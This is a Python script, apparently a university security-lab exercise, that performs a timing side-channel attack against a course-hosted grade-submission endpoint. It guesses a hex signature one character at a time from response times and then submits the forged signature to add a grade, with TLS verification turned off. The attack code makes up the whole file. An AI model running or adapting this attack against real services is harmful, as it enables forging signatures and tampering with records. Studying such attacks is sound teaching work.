import requests
from datetime import datetime

requests.packages.urllib3.disable_warnings()

# An timing attack based on time consuming chrcmp function
def timing_attack(name, grade, size=20, retries=10):
  url = 'https://eitn41.eit.lth.se:3119/ha4/addgrade.php'
  params = {'name': name, 'grade': grade, 'signature': ''}
  hex_string = '0123456789abcdef'
  print('Searching...')
  start = datetime.now()

  signature = [''] * size
  i, T = 0, [0] + [float('inf')] * size

  while(i < size):
    max_char, max_t = None, 0

    for j in range(len(hex_string)):
      curr_char = hex_string[j]
      params['signature'] = ''.join(signature)[:i] + curr_char

      R = [requests.get(url, params, verify=False) for retry in range(retries)]
      t = min([r.elapsed.total_seconds() for r in R])

      if t > max_t:
        max_char, max_t = curr_char, t

      if t < T[i+1]:
        T[i+1] = t

    if not T[i] < T[i+1]:
      i = max(i - 1, 0)
      T[i+1] = float('inf')
      retries += 1
      print('{}/{} redo with retries: {}'.format(i, size, retries))
    else:
      signature[i] = max_char
      i += 1

    print('{}/{}'.format(i, size), ''.join(signature)[:i])
  
  params['signature'] = ''.join(signature)
  r = requests.get(url, params, verify=False)
  print('Sign verified:', int(r.text) == 1)
  print('Elapsed time', datetime.now() - start)

  return params

if __name__ == '__main__':
  # Kalle, 5 => 6823ea50b133c58cba36
  params = timing_attack(input('Name: '), int(input('Grade: ')), retries=int(input('Retries: ')))
  print(params)
